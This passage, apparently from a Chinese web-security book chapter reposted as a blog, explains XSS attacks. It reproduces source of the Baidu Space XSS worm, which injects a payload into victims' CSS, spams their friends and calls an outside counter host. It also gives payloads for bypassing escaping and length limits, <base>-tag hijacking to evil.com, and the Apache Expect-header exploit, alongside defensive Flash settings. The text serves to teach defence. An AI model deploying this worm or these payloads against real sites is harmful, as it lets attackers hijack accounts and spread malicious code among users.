class="line"></div><div class="line">  re = /\&lt;input type=\"hidden\" id=\"cm\" name=\"cm\" value=\"(.*?)\"/i;</div><div class="line">  cm = s.match(re);</div><div class="line">  cm=(cm[1])/1+1;</div><div class="line"></div><div class="line">  re = /\&lt;input type=\"hidden\" id=\"spCssID\" name=\"spCssID\" value=\"(.*?)\"/i;</div><div class="line">  spCssID = s.match(re);</div><div class="line">  spCssID=(spCssID[1]);</div><div class="line"></div><div class="line">  spRefUrl=editurl;</div><div class="line"></div><div class="line">  re = /\&lt;textarea(.*?)\&gt;([^\x00]*?)\&lt;\/textarea\&gt;/i;</div><div class="line">  spCssText = s.match(re);</div><div class="line">  spCssText=spCssText[2];</div><div class="line">  spCssText=URLEncoding(spCssText);</div><div class="line"></div><div class="line">  if(spCssText.indexOf('evilmask')!==-1) &#123;</div><div class="line">    return 1;</div><div class="line">  &#125;</div><div class="line">  else spCssText=spCssText+"\r\n\r\n"+playload;</div><div class="line"></div><div class="line">  re = /\&lt;input name=\"spCssName\"(.*?)value=\"(.*?)\"&gt;/i;</div><div class="line">  spCssName = s.match(re);</div><div class="line">  spCssName=spCssName[2];</div><div class="line"></div><div class="line">  re = /\&lt;input name=\"spCssTag\"(.*?)value=\"(.*?)\"&gt;/i;</div><div class="line">  spCssTag = s.match(re);</div><div class="line">  spCssTag=spCssTag[2];</div><div class="line"></div><div class="line">  postdata="ct="+ct+"&amp;spCssUse=1"+"&amp;spCssColorID=1"+"&amp;spCssLayoutID=-1"+"&amp;spRefURL="+UR</div><div class="line">  LEncoding(spRefUrl)+"&amp;spRefURL="+URLEncoding(spRefUrl)+"&amp;cm="+cm+"&amp;spCssID="+spCssID+</div><div class="line">  "&amp;spCssText="+spCssText+"&amp;spCssName="+URLEncoding(spCssName)+"&amp;spCssTag="+URLEncoding</div><div class="line">  (spCssTag);</div><div class="line">  result=postmydata(action,postdata);</div><div class="line">  sendfriendmsg();</div><div class="line">  count();</div><div class="line">  hack();</div><div class="line">&#125;</div><div class="line"></div><div class="line">function goteditcss() &#123;</div><div class="line">  src="http://hi.baidu.com"+spaceid+"/modify/spcrtempl/0";</div><div class="line">  s=getmydata(src);</div><div class="line">  re = /\&lt;link rel=\"stylesheet\" type=\"text\/css\"</div><div class="line">  href=\"(.*?)\/css\/item\/(.*?)\.css\"&gt;/i;</div><div class="line">  r = s.match(re);</div><div class="line">  nowuse=r[2];</div><div class="line">  makeevilcss(spaceid,"http://hi.baidu.com"+spaceid+"/modify/spcss/"+nowuse+".css/edit"</div><div class="line">  ,1);</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function poster()&#123;</div><div class="line">  var request = false;</div><div class="line">  if(window.XMLHttpRequest) &#123;</div><div class="line">    request = new XMLHttpRequest();</div><div class="line">    if(request.overrideMimeType) &#123;</div><div class="line">      request.overrideMimeType('text/xml');</div><div class="line">    &#125;</div><div class="line">  &#125; else if(window.ActiveXObject) &#123;</div><div class="line">    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP',</div><div class="line">    'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0',</div><div class="line">    'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];</div><div class="line">    for(var i=0; i&lt;versions.length; i++) &#123;</div><div class="line">      try &#123;</div><div class="line">        request = new ActiveXObject(versions[i]);</div><div class="line">      &#125; catch(e) &#123;&#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return request;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function postmydata(action,data)&#123;</div><div class="line">  xmlhttp.open("POST", action, false);</div><div class="line">  xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');</div><div class="line">  xmlhttp.send(data);</div><div class="line">  return xmlhttp.responseText;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function getmydata(action)&#123;</div><div class="line">  xmlhttp.open("GET", action, false);</div><div class="line">  xmlhttp.send();</div><div class="line">  return xmlhttp.responseText;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function killErrors() &#123;</div><div class="line">  return true;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function count() &#123;</div><div class="line">  a=new Image();</div><div class="line">  a.src='http://img.users.51.la/1563171.asp';</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function online() &#123;</div><div class="line">  online=new Image();</div><div class="line">  online.src='http://img.users.51.la/1563833.asp ';</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function hack() &#123;</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function sendfriendmsg()&#123;</div><div class="line">  myfurl=myhibaidu+"/friends";</div><div class="line">  s=getmydata(myfurl);</div><div class="line">  evilmsg="哈，节日快乐呀!热烈庆祝2008，心情好好，记得要想我呀！</div><div class="line">  \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"+myhibai</div><div class="line">  du;</div><div class="line"></div><div class="line">  var D=function(A,B)&#123;A[A.length]=B;&#125;;</div><div class="line">  re = /(.+)D\(k\,\[([^\]]+?)\]\)(.*)/g;</div><div class="line">  friends = s.match(re);</div><div class="line">  eval(friends[0]);</div><div class="line">  for(i in k) &#123;</div><div class="line">    eval('msgimg'+i+'=new Image();');</div><div class="line">    eval('msgimg'+i+'.src="http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn="+URLE</div><div class="line">    ncoding(k[i][2])+"&amp;co="+URLEncoding(evilmsg)+"&amp;vcodeinput=";');</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>后来又增加了一个传播函数，不过那个时候百度已经开始屏蔽此蠕虫了：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">function onlinemsg()&#123;</div><div class="line">  doit=Math.floor(Math.random() * (600 + 1));</div><div class="line">  if(doit&gt;500) &#123;</div><div class="line">    evilonlinemsg="哈哈,还记得我不,加个友情链接吧?\r\n\r\n\r\n我的地址是"+myhibaidu;</div><div class="line">    xmlDoc=new ActiveXObject("Microsoft.XMLDOM");</div><div class="line">    xmlDoc.async=false;</div><div class="line">    xmlDoc.load("http://hi.baidu.com/sys/file/moreonline.xml");</div><div class="line">    online=xmlDoc.documentElement;</div><div class="line">    users=online.getElementsByTagName("id");</div><div class="line">    x=Math.floor(Math.random() * (200 + 1));</div><div class="line">    eval('msgimg'+x+'=new Image();');</div><div class="line">    eval('msgimg'+x+'.src="http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=</div><div class="line">    "+URLEncoding(users[x].text)+"&amp;co="+URLEncoding(evilonlinemsg)+"&amp;vcodeinput=";');</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>攻击者想要通过XSS做坏事是很容易的，而XSS Worm则能够把这种破坏无限扩大，这正是大型网站所特别担心的事情</p>
<p>无论是MySpace蠕虫，还是百度空间的蠕虫，都是“善意”的蠕虫，它们只是在“恶作剧”，而没有真正形成破坏。真正可怕的蠕虫，是那些在无声无息地窃取用户数据、骗取密码的“恶意”蠕虫，这些蠕虫并不会干扰用户的正常使用，非常隐蔽。</p>
<p><hr></p>
<h3 id="3-2-6-XSS构造技巧"><a href="#3-2-6-XSS构造技巧" class="headerlink" title="3.2.6 XSS构造技巧"></a>3.2.6 XSS构造技巧</h3><p>“百度搜藏”曾经出现过一个这样的XSS漏洞。百度在一个<code>&lt;script&gt;</code>标签中输出了一个变量，其中转义了双引号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var redirectUrl=&quot;\&quot;;</div><div class="line">alert(/XSS/);&quot;;</div></pre></td></tr></table></figure>
<p>一般来说，这里是没有XSS漏洞的，因为变量处于双引号之内，系统转义了双引号导致变量无法<kbd> <code>escape</code> </kbd>。</p>
<p>但是，百度的返回页面是<kbd>GBK/GB2312</kbd>编码的，因此<kbd><code>%c1\</code> </kbd> 这两个字符组合在一起后，会成为一个Unicode字符。在Firefox下会认为这是一个字符，所以构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">%c1&quot;;alert(/XSS/);//</div></pre></td></tr></table></figure>
<p>并提交：</p>
<p>提交的数据包在Firefox下得到如下效果：</p>
<p>在Firefox下的效果</p>
<p>这两个字节：<kbd><code>%c1\</code></kbd>组成了一个新的Unicode字符，<kbd><code>%c1</code></kbd>把转义符号<kbd><code>\</code></kbd>给“吃掉了”，从而绕过了系统的安全检查，成功实施了<kbd><code>XSS</code></kbd>攻击。</p>
<p>绕过长度限制</p>
<p>很多时候，产生XSS的地方会有变量的长度限制，这个限制可能是服务器端逻辑造成的。假设下面代码存在一个XSS漏洞：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">value</span>=<span class="string">"$var"</span> /&gt;</span></div></pre></td></tr></table></figure>
<p>服务器端如果对输出变量<kbd>$var</kbd>做了严格的长度限制，那么攻击者可能会这样构造XSS：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$var为： &quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>希望达到的输出效果是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" /&gt;</div></pre></td></tr></table></figure>
<p>假设长度限制为20个字节，则这段XSS会被切割为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"></div><div class="line">$var 输出为： &quot;&gt;&lt;script&gt; alert(/xss</div></pre></td></tr></table></figure>
<p>连一个完整的函数都无法写完，XSS攻击可能无法成功。那此时，是不是万事大吉了呢？答案是否定的。<br>攻击者可以利用事件（Event）来缩短所需要的字节数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$var 输出为： &quot;onclick=alert(1)//</div><div class="line">加上空格符，刚好够20个字节，实际输出为：</div><div class="line">&lt;input type=text value=&quot;&quot; onclick=alert(1)// &quot;/&gt;</div><div class="line">当用户点击了文本框后，alert()将执行.</div></pre></td></tr></table></figure>
<p>但利用“事件”能够缩短的字节数是有限的。最好的办法是把<kbd>XSS Payload</kbd> 写到别处，再通过简短的代码加载这段<kbd>XSS Payload </kbd> 。</p>
<p>最常用的一个“藏代码”的地方，就是<kbd>location.hash</kbd>  。而且根据HTTP协议，location.hash的内容不会在HTTP包中发送，所以服务器端的Web日志中并不会记录下<kbd>location.hash</kbd> 里的内容，从而也更好地隐藏了黑客真实的意图。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$var 输出为： &quot; onclick=&quot;eval(location.hash.substr(1))</div></pre></td></tr></table></figure>
<p>总共是40个字节。输出后的HTML是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"eval(location.hash.substr(1)) "</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--因为location.hash的第一个字符是 # ，所以必须去除第一个字符才行。此时构造出的XSS URL为：--&gt;</span></div><div class="line">http://www.a.com/test.html#alert(1)</div></pre></td></tr></table></figure>
<p>用户点击文本框时，<kbd><code>location.hash</code></kbd>  里的代码执行了。</p>
<p><kbd><code>location.hash</code></kbd> 本身没有长度限制，但是浏览器的地址栏是有长度限制的，不过这个长度已经足够写很长的<kbd>XSS Payload</kbd> 了。要是地址栏的长度也不够用，还可以再使用加载远程JS的方法，来写更多的代码。</p>
<p>在某些环境下，可以利用注释符绕过长度限制。<br>比如我们能控制两个文本框，第二个文本框允许写入更多的字节。此时可以利用HTML的“注释符号”，把两个文本框之间的HTML代码全部注释掉，从而“打通”两个<code>&lt;input&gt;</code> 标签。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;input id=1 type=&quot;text&quot; value=&quot;&quot; /&gt;</div><div class="line">xxxxxxxxxxxxx</div><div class="line">&lt;input id=2 type=&quot;text&quot; value=&quot;&quot; /&gt;</div><div class="line">在第一个input框中，输入：</div><div class="line"> &quot;&gt;&lt;!--</div><div class="line">在第二个input框中，输入：--&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;</div><div class="line">最终的效果是：</div><div class="line">&lt;input id=1 type=&quot;text&quot; value=&quot;&quot;&gt;&lt;!--&quot; /&gt;</div><div class="line">xxxxxxxxxxxxxxxxx</div><div class="line">&lt;input id=2 type=&quot;text&quot; value=&quot;--&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&quot; /&gt;</div><div class="line">中间的代码全部被</div><div class="line">&lt;!--  … --&gt;</div></pre></td></tr></table></figure>
<p>给注释掉了！</p>
<p>而在第一个input框中，只用到了短短的6个字节！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">使用&lt;base&gt;标签</div><div class="line">&lt;base&gt;标签并不常用，它的作用是定义页面上的所有使用“相对路径”标签的hosting地址。</div><div class="line">比如，打开一张不存在的图片：</div><div class="line">&lt;body&gt;</div><div class="line">&lt;img src=&quot;/intl/en_ALL/images/srpr/logo1w.png&quot; /&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">测试页面</div><div class="line">这张图片实际上是Google的一张图片，原地址为：http://www.google.com/intl/en_ALL/images/srpr/logo1w.png</div><div class="line">在&lt;img&gt;标签前加入一个&lt;base&gt;标签：</div><div class="line">&lt;body&gt;</div><div class="line">&lt;base href=&quot;http://www.google.com&quot; /&gt;</div><div class="line">&lt;img src=&quot;/intl/en_ALL/images/srpr/logo1w.png&quot; /&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;base&gt;标签将指定其后的标签默认从“http://www.google.com”取URL：</div><div class="line">测试页面图片被找到了。</div><div class="line">需要特别注意的是，在有的技术文档中，提到&lt;base&gt;标签只能用于&lt;head&gt;标签之内，其实这是不对的。&lt;base&gt;标签可以出现在页面的任何地方，并作用于位于该标签之后的所有标签。</div><div class="line">攻击者如果在页面中插入了&lt;base&gt;标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面中的所有使用“相对路径”的标签。比如：</div><div class="line">&lt;base href=&quot;http://www.evil.com&quot; /&gt;</div><div class="line">….</div><div class="line">&lt;script src=&quot;x.js&quot; &gt;&lt;/script&gt;</div><div class="line">….</div><div class="line">&lt;img src=&quot;y.jpg&quot; /&gt;</div><div class="line">…</div><div class="line">&lt;a href=&quot;auth.do&quot; &gt;auth&lt;/a&gt;</div><div class="line">所以在设计XSS安全方案时，一定要过滤掉这个非常危险的标签。</div></pre></td></tr></table></figure>
<hr>

<p><kbd><code>window.name</code></kbd> 的妙用</p>
<p><kbd><code>window.name</code></kbd> 对象是一个很神奇的东西。对当前窗口的<kbd><code>window.name</code></kbd> 对象赋值，没有特殊字符的限制。因为window对象是浏览器的窗体，而并非document对象，因此很多时候window对象不受同源策略的限制。攻击者利用这个对象，可以实现跨域、跨页面传递数据。在某些环境下，这种特性将变得非常有用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">参考以下案例。假设“www.a.com/test.html”的代码为：</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line">window.name = &quot;test&quot;;</div><div class="line">alert(document.domain+&quot;    &quot;+window.name);</div><div class="line">window.location = &quot;http://www.b.com/test1.html&quot;;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">这段代码将window.name赋值为test，然后显示当前域和window.name的值，最后将页面跳转到“www.b.com/test1.html”。</div><div class="line">“www.b.com/test1.html”的代码为：</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line">alert(document.domain+&quot;    &quot;+window.name);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p>这里显示了当前域和<kbd><code>window.name</code></kbd> 的值。最终效果如下，访问“www.a.com/test.html”：</p>
<p>测试页面<br><kbd><code>window.name</code></kbd> 赋值成功，然后页面自动跳转到”www.b.com/test1.html”：</p>
<p>测试页面<br>这个过程实现数据的跨域传递：“test”这个值从www.a.com传递到www.b.com。</p>
<p>使用<kbd>window.name</kbd> 可以缩短 <code>XSS Payload</code>的长度，如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="built_in">window</span>.name = <span class="string">"alert(document.cookie)"</span>;</div><div class="line">locaton.href = <span class="string">"http://www.xssedsite.com/xssed.php"</span>;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在同一窗口打开XSS的站点后，只需通过XSS执行以下代码即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">eval(name);</div></pre></td></tr></table></figure>
<p>只有11个字节，短到了极点。</p>
<p>这个技巧为安全研究者luoluo所发现，同时他还整理了很多绕过XSS长度限制的技巧。</p>
<p><hr></p>
<h3 id="3-2-7-变废为宝：Mission-Impossible"><a href="#3-2-7-变废为宝：Mission-Impossible" class="headerlink" title="3.2.7 变废为宝：Mission Impossible"></a>3.2.7 变废为宝：<kbd>Mission Impossible</kbd></h3><p>从XSS漏洞利用的角度来看，存储型XSS对攻击者的用处比反射型XSS要大。因为存储型XSS在用户访问正常URL时会自动触发；而反射型XSS会修改一个正常的URL，一般要求攻击者将XSS URL发送给用户点击，无形中提高了攻击的门槛。</p>
<p>而有的XSS漏洞，则被认为只能够攻击自己，属于“鸡肋”漏洞。但随着时间的推移，数个曾经被认为是无法利用的XSS漏洞，都被人找到了利用方法。</p>
<p><hr></p>
<h3 id="3-2-7-1-Apache-Expect-Header-XSS"><a href="#3-2-7-1-Apache-Expect-Header-XSS" class="headerlink" title="3.2.7.1　Apache Expect Header XSS"></a>3.2.7.1　Apache Expect Header XSS</h3><p>“Apache Expect Header XSS”漏洞最早公布于2006年。这个漏洞曾一度被认为是无法利用的，所以厂商不认为这是个漏洞。这个漏洞的影响范围是：Apache Httpd Server版本1.3.34、2.0.57、2.2.1及以下。漏洞利用过程如下。</p>
<p>向服务器提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET / HTTP/1.1</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en-gb</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Expect: &lt;script&gt;alert(&apos;http://www.whiteacid.org is vulnerable to the Expect Header</div><div class="line">vulnerability.&apos;);&lt;/script&gt;</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET</div><div class="line">CLR 1.1.4322)</div><div class="line">Host: www.whiteacid.org</div><div class="line">Connection: Keep-Alive</div></pre></td></tr></table></figure>
<p>服务器返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">HTTP/1.1 417 Expectation Failed</div><div class="line">Date: Thu, 21 Sep 2006 20:44:52 GMT</div><div class="line">Server: Apache/1.3.33 (Unix) mod_throttle/3.1.2 DAV/1.0.3 mod_fastcgi/2.4.2</div><div class="line">mod_gzip/1.3.26.1a PHP/4.4.2 mod_ssl/2.8.22 OpenSSL/0.9.7e</div><div class="line">Keep-Alive: timeout=5, max=100</div><div class="line">Connection: Keep-Alive</div><div class="line">Transfer-Encoding: chunked</div><div class="line">Content-Type: text/html; charset=iso-8859-1</div><div class="line">1ba</div><div class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</div><div class="line">&lt;HTML&gt;&lt;HEAD&gt;</div><div class="line">&lt;TITLE&gt;417 Expectation Failed&lt;/TITLE&gt;</div><div class="line">&lt;/HEAD&gt;&lt;BODY&gt;</div><div class="line">&lt;H1&gt;Expectation Failed&lt;/H1&gt;</div><div class="line">The expectation given in the Expect request-header</div><div class="line">field could not be met by this server.&lt;P&gt;</div><div class="line">The client sent&lt;PRE&gt;</div><div class="line">Expect: &lt;script&gt;alert(&apos;http://www.whiteacid.org is vulnerable to the Expect Header</div><div class="line">vulnerability.&apos;);&lt;/script&gt;</div><div class="line">&lt;/PRE&gt;</div><div class="line">but we only allow the 100-continue expectation.</div><div class="line">&lt;/BODY&gt;&lt;/HTML&gt;</div><div class="line">0</div></pre></td></tr></table></figure>
<p>注意到服务器在出错返回时，会把Expect头的内容未经任何处理便写入到页面中，因此Expect头中的HTML代码就被浏览器解析执行了。这是Apache的漏洞，影响范围相当广。从这个攻击过程可以看出，需要在提交请求时向HTTP头中注入恶意数据，才能触发这个漏洞。但对于XSS攻击来说，JavaScript工作在渲染后的浏览器环境中，无法控制用户浏览器发出的HTTP头。因此，这个漏洞曾经一度被认为是“鸡肋”漏洞。</p>
<p>后来安全研究者Amit Klein提出了“使用Flash构造请求”的方法，成功地利用了这个漏洞，变废为宝！</p>
<p>在Flash中发送HTTP请求时，可以自定义大多数的HTTP头。如下是Amit Klein的演示代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">//Credits to Amit Klein as he wrote this, I just decompiled it</div><div class="line">inURL = this._url;</div><div class="line">inPOS = inURL.lastIndexOf(&quot;?&quot;);</div><div class="line">inParam = inURL.substring(inPOS + 1, inPOS.length);</div><div class="line">req = new LoadVars();</div><div class="line">req.addRequestHeader(&quot;Expect&quot;, &quot;&lt;script&gt;alert(\&apos;&quot; + inParam + &quot; is vulnerable to the</div><div class="line">Expect Header vulnerability.\ &apos;);&lt;/script&gt;&quot;);</div><div class="line">req.send(inParam, &quot;_blank&quot;, &quot;POST&quot;);</div></pre></td></tr></table></figure>
<p>正因为此，Flash在新版本中禁止用户自定义发送Expect头。但后来发现可以通过注入HTTP头的方式绕过这个限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">req.addRequestHeader(&quot;Expect:FooBar&quot;,&quot;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&quot;);</div></pre></td></tr></table></figure>
<p>目前Flash已经修补好了这些问题。<br>此类攻击，还可以通过Java Applet等构造HTTP请求的第三方插件来实现。</p>
<p><hr><br>Anehta的回旋镖</p>
<p>反射型XSS也有可能像存储型XSS一样利用：将要利用的反射型XSS嵌入一个存储型XSS中。这个攻击技巧，曾经在笔者实现的一个XSS攻击平台（Anehta）中使用过，笔者将其命名为“回旋镖”。<br>因为浏览器同源策略的原因，XSS也受到同源策略的限制——发生在A域上的XSS很难影响到B域的用户。<br>回旋镖的思路就是：如果在B域上存在一个反射型“XSS_B”，在A域上存在一个存储型“XSS_A”，当用户访问A域上的“XSS_A”时，同时嵌入B域上的“XSS_B”，则可以达到在A域的XSS攻击B域用户的目的。</p>
<p>我们知道，在IE中，<kbd><code>&lt;iframe&gt;、&lt;img&gt;、&lt;link&gt;</code> <kbd> 等标签都会拦截“第三方Cookie”的发送，而在Firefox中则无这种限制（第三方Cookie即指保存在本地的Cookie，也就是服务器设置了expire时间的Cookie）。</kbd></kbd></p>
<p>所以，对于Firefox来说，要实现回旋镖的效果非常简单，只需要在XSS_A处嵌入一个iframe即可：<code>&lt;iframe src=&quot;http://www.b.com/?xss.... &quot; &gt;&lt;/iframe&gt;</code><br>但是对于IE来说，则要麻烦很多。为了达到执行XSS_B的目的，可以使用一个<form>标签，在浏览器提交form表单时，并不会拦截第三方Cookie的发送。</form></p>
<p>因此，先在XSS_A上写入一个<kbd><code>&lt;form&gt;</code></kbd> ，自动提交到XSS_B，然后在XSS_B中再跳转回原来的XSS_A，即完成一个“回旋镖”的过程。但是这种攻击的缺点是，尽管跳转花费的时间很短，但用户还是会看到浏览器地址栏的变化。</p>
<p>如果能在B域上找到一个302跳转的页面，也可以不使用form表单，这样会更加方便。<br>虽然“回旋镖”并不是一种完美的漏洞利用方式，但也能将反射型XSS的效果变得更加自动化。<br>XSS漏洞是一个Web安全问题，不能因为它的利用难易程度而决定是否应该修补。随着技术的发展，某些难以利用的漏洞，也许不再是难题。</p>
<p><hr></p>
<h3 id="3-2-8-容易被忽视的角落：-Flash-XSS"><a href="#3-2-8-容易被忽视的角落：-Flash-XSS" class="headerlink" title="3.2.8 容易被忽视的角落： Flash XSS "></a>3.2.8 容易被忽视的角落：<kbd> Flash XSS </kbd></h3><p>前文讲到的XSS攻击都是基于HTML的，其实在Flash中同样也有可能造成XSS攻击。<br>在Flash中是可以嵌入ActionScript脚本的。一个最常见的Flash XSS可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">getURL(&quot;javascript:alert(document.cookie)&quot;)</div><div class="line">将Flash嵌入页面中：</div><div class="line">&lt;embed src=&quot;http://yourhost/evil.swf&quot;</div><div class="line">pluginspage=&quot;http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=S</div><div class="line">hockwaveFlash&quot;</div><div class="line">type=&quot;application/x-shockwave-flash&quot;</div><div class="line">width=&quot;0&quot;</div><div class="line">height=&quot;0&quot;</div><div class="line">&gt;&lt;/embed&gt;</div><div class="line">&gt;ActionScript是一种非常强大和灵活的脚本，甚至可以使用它发起网络连接，因此应该尽可能地禁止用户能够上传或加载自定义的Flash文件。</div><div class="line">&gt;</div></pre></td></tr></table></figure>
<p>2016-04-06</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">由于Flash文件如此危险，所以在实现XSS Filter时，一般都会禁用&lt;embed&gt;、&lt;object&gt;等标签。后者甚至可以加载ActiveX控件，能够产生更为严重的后果。</div><div class="line"></div><div class="line"></div><div class="line">如果网站的应用一定要使用Flash怎么办？一般来说，如果仅仅是视频文件，则要求转码为“flv文件”。flv文件是静态文件，不会产生安全隐患。如果是带动态脚本的Flash，则可以通过Flash的配置参数进行限制。</div><div class="line"></div><div class="line"></div><div class="line">&gt;常见的嵌入Flash的代码如下：</div><div class="line">&gt;&lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot;</div><div class="line">&gt;codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#versi</div><div class="line">&gt;on=8,0,0,0&quot;</div><div class="line">&gt;name=&quot;Main&quot; width=&quot;1000&quot; height=&quot;600&quot; align=&quot;middle&quot; id=&quot;Main&quot;&gt;</div><div class="line"></div><div class="line">&lt;embed flashvars=&quot;site=&amp;sitename=&quot; src=&apos;Loading.swf?user=453156346&apos; width=&quot;1000&quot;</div><div class="line">height=&quot;600&quot; align=&quot;middle&quot; quality=&quot;high&quot; name=&quot;Main&quot; allowscriptaccess=&quot;sameDomain&quot;</div><div class="line">type=&quot;application/x-shockwave-flash&quot;</div><div class="line">pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;</div><div class="line"></div><div class="line">&lt;/object&gt;</div></pre></td></tr></table></figure>
<p>限制Flash动态脚本的最重要的参数是“allowScriptAccess”，这个参数定义了Flash能否与HTML页面进行通信。它有三个可选值：<br>always，对与HTML的通信也就是执行JavaScript不做任何限制；<br>sameDomain，只允许来自于本域的Flash与Html通信，这是默认值；<br>never，绝对禁止Flash与页面通信。<br>使用always是非常危险的，一般推荐使用never。如果值为sameDomain的话，请务必确保Flash文件不是用户传上来的。</p>
<p><code>allowNetworking</code>也非常关键，这个参数能控制Flash与外部网络进行通信。它有三个可选值：<br>all，允许使用所有的网络通信，也是默认值；<br>internal，Flash不能与浏览器通信如navigateToURL，但是可以调用其他的API；<br>none，禁止任何的网络通信。<br>一般建议此值设置为none或者internal。设置为all可能带来安全问题。</p>
<p>除了用户的Flash文件能够实施脚本攻击外，一些Flash也可能会产生XSS漏洞。看如下ActionScript代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">on (release) &#123;</div><div class="line">getURL (_root.clickTAG, &quot;_blank&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码经常出现在广告的Flash中，用于控制用户点击后的URL。但是这段代码缺乏输入验证，可以被XSS攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://url/to/flash-file.swf?clickTAG=javascript:alert(&apos;xss&apos;)</div></pre></td></tr></table></figure>
<p>安全研究者Stefano Di Paola曾经写了一个叫“SWFIntruder”的工具来检测产生在Flash里的XSS漏洞，通过这个工具可以检测出很多注入Flash变量导致的XSS问题。</p>
<p>要修补本例中的漏洞，可以使用输入检查的方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">on (release) &#123;</div><div class="line">  <span class="keyword">if</span> (_root.clickTAG.substring(<span class="number">0</span>,<span class="number">5</span>)== <span class="string">"http:"</span> ||</div><div class="line">  _root.clickTAG.substring(<span class="number">0</span>,<span class="number">6</span>)== <span class="string">"https:"</span> ||</div><div class="line">  _root.clickTAG.substring(<span class="number">0</span>,<span class="number">1</span>)== <span class="string">"/"</span>) &#123;</div><div class="line">    getURL (_root.clickTAG, <span class="string">"_blank"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
